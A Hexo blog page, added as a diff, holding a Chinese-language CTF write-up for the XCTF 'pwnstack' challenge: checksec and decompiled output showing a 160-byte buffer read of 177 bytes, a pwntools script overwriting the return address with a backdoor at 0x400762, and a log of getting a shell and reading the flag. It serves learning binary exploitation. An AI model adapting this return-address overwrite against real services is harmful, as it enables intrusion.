@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/me.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/me.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/me.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fishcanf1y.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="攻防世界-pwnstack题解一、简述【题型】PWN【题目】pwnstack【来源】[攻防世界](https:&#x2F;&#x2F;adworld.xctf.org.cn&#x2F;challenges&#x2F;list）【思路】栈溢出 二、思路及过程Step.1：先使用checksec和file了解有关这个文件的一些信息 12345678910111213# zer0-r1ng @ ring0rez-Laptop in ~&#x2F;Cha">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界-pwnstack题解">
+<meta property="og:url" content="http://fishcanf1y.github.io/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:site_name" content="fishcanf1yのBlog">
+<meta property="og:description" content="攻防世界-pwnstack题解一、简述【题型】PWN【题目】pwnstack【来源】[攻防世界](https:&#x2F;&#x2F;adworld.xctf.org.cn&#x2F;challenges&#x2F;list）【思路】栈溢出 二、思路及过程Step.1：先使用checksec和file了解有关这个文件的一些信息 12345678910111213# zer0-r1ng @ ring0rez-Laptop in ~&#x2F;Cha">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-02-06T08:55:35.000Z">
+<meta property="article:modified_time" content="2025-07-24T04:39:02.018Z">
+<meta property="article:author" content="fishcanf1y">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://fishcanf1y.github.io/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://fishcanf1y.github.io/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/","path":"2025/02/06/攻防世界-pwnstack题解/","title":"攻防世界-pwnstack题解"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>攻防世界-pwnstack题解 | fishcanf1yのBlog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">fishcanf1yのBlog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3"><span class="nav-number">1.</span> <span class="nav-text">攻防世界-pwnstack题解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E8%BF%B0"><span class="nav-number">1.0.1.</span> <span class="nav-text">一、简述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%80%9D%E8%B7%AF%E5%8F%8A%E8%BF%87%E7%A8%8B"><span class="nav-number">1.0.2.</span> <span class="nav-text">二、思路及过程</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fishcanf1y"
+      src="/images/me.jpg">
+  <p class="site-author-name" itemprop="name">fishcanf1y</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fishcanf1y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fishcanf1y" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:iszhenghailin@gmail.com" title="E-Mail → mailto:iszhenghailin@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/fishcanf1y_" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;fishcanf1y_" rel="noopener me" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/fishcanf1y" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fishcanf1y" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://securenexuslab.github.io/" title="https:&#x2F;&#x2F;SecureNexusLab.github.io" rel="noopener" target="_blank">SecureNexusLab</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://fishcanf1y.github.io/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/me.jpg">
+      <meta itemprop="name" content="fishcanf1y">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fishcanf1yのBlog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="攻防世界-pwnstack题解 | fishcanf1yのBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          攻防世界-pwnstack题解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-02-06 16:55:35" itemprop="dateCreated datePublished" datetime="2025-02-06T16:55:35+08:00">2025-02-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-07-24 12:39:02" itemprop="dateModified" datetime="2025-07-24T12:39:02+08:00">2025-07-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="攻防世界-pwnstack题解"><a href="#攻防世界-pwnstack题解" class="headerlink" title="攻防世界-pwnstack题解"></a>攻防世界-pwnstack题解</h2><h4 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h4><p>【题型】<a href="">PWN</a><br>【题目】<code>pwnstack</code><br>【来源】[攻防世界](<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/list）</a><br>【思路】<a href="">栈溢出</a></p>
+<h4 id="二、思路及过程"><a href="#二、思路及过程" class="headerlink" title="二、思路及过程"></a>二、思路及过程</h4><p>Step.1：先使用<code>checksec</code>和<code>file</code>了解有关这个文件的一些信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># zer0-r1ng @ ring0rez-Laptop in ~/Challenge/Adworld/pwnstack/[16:27:17]</span></span><br><span class="line">$ checksec pwn2</span><br><span class="line">[*] <span class="string">&#x27;/Challenge/Adworld/pwnstack/pwn2&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line"><span class="comment"># zer0-r1ng @ ring0rez-Laptop in ~/Challenge/Adworld/pwnstack/[16:30:13] C:1</span></span><br><span class="line">$ file pwn2</span><br><span class="line">pwn2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=62aa40d64871e142a32827b4e403772e72f67fba, not stripped</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们从中可以得知它是一个64位的ELF格式文件</p>
+<p>Step.2：放入IDA Pro中进行分析</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">initsetbuf</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;this is pwn1,can you do that??&quot;</span>);</span><br><span class="line">  <span class="built_in">vuln</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在里面我们发现了一个非常可疑的<code>puts</code> 和<code>vuln</code> 函数，点进去看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[160]; // [rsp+0h] [rbp-A0h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(buf, 0, sizeof(buf));</span><br><span class="line">  read(0, buf, 0xB1uLL);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在vuln函数中我们可以看到函数分配了一个大小为 160 字节的缓冲区 <code>buf</code>，然后使用 <code>read</code> 函数从标准输入（文件描述符 0）读取数据到这个缓冲区中。然而，<code>read</code> 函数被指示读取最多 0xB1（即 177）字节的数据，这比缓冲区 <code>buf</code> 能够容纳的多，从而导致了缓冲区溢出的风险。</p>
+<p>Step.5：shift+F12查看字符串发现<code>/bin/sh</code>，进入发现后门函数，查看地址（ctr+x）发现为：<code>0x400762</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0000000000400238</span>		<span class="number">0000001</span>C	C	/lib64/ld-linux-x86<span class="number">-64.</span>so.<span class="number">2</span></span><br><span class="line">LOAD:<span class="number">00000000004003B</span>9		<span class="number">0000000</span>A	C	libc.so.<span class="number">6</span></span><br><span class="line">LOAD:<span class="number">00000000004003</span>C8		<span class="number">00000006</span>	C	<span class="built_in">stdin</span></span><br><span class="line">LOAD:<span class="number">00000000004003</span>D3		<span class="number">00000007</span>	C	<span class="built_in">stdout</span></span><br><span class="line">LOAD:<span class="number">00000000004003</span>DA		<span class="number">00000007</span>	C	<span class="built_in">stderr</span></span><br><span class="line">LOAD:<span class="number">00000000004003E1</span>		<span class="number">00000007</span>	C	system</span><br><span class="line">LOAD:<span class="number">00000000004003E8</span>		<span class="number">00000008</span>	C	setvbuf</span><br><span class="line">LOAD:<span class="number">00000000004003F</span>0		<span class="number">00000012</span>	C	__libc_start_main</span><br><span class="line">LOAD:<span class="number">0000000000400402</span>		<span class="number">0000000F</span>	C	__gmon_start__</span><br><span class="line">LOAD:<span class="number">0000000000400411</span>		<span class="number">0000000</span>C	C	GLIBC_2.<span class="number">2.5</span></span><br><span class="line">.rodata:<span class="number">0000000000400838</span>	<span class="number">00000008</span>	C	/bin/sh</span><br><span class="line">.rodata:<span class="number">0000000000400848</span>	<span class="number">0000001F</span>	C	this is pwn1,can you <span class="keyword">do</span> that??</span><br><span class="line">.eh_frame:<span class="number">000000000040091F</span>	<span class="number">00000006</span>	C	;*<span class="number">3</span>$\<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Step.6：构造exp并caught到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&quot;Host&quot;,Port)</span><br><span class="line">payload=b&#x27;a&#x27;*0xa8+p64(0x400762)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>在上面的exp代码中使用了<code>pwntools</code>库并连接到远程服务器，随后我们构造了一个长度为”0xa8“并用’a’去填充和类型为二进制数据的payload，并覆盖返回地址到<code>0x400762</code>并将返回地址转换为小端序的64位进行表示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">zer0-r1ng @ ring0rez-Laptop <span class="keyword">in</span> ~/Challenge/Adworld/pwnstack/[16:50:22]</span><br><span class="line">$ python3 exp.py</span><br><span class="line">[+] Opening connection to 61.147.171.105 on port 54428: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">this is pwn1,can you <span class="keyword">do</span> that??</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">pwn2</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">cyberpeace&#123;9d0526386a432e6fcf65858cd1ee804d&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" rel="next" title="条件竞争漏洞学习">
+                  条件竞争漏洞学习 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">fishcanf1y</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
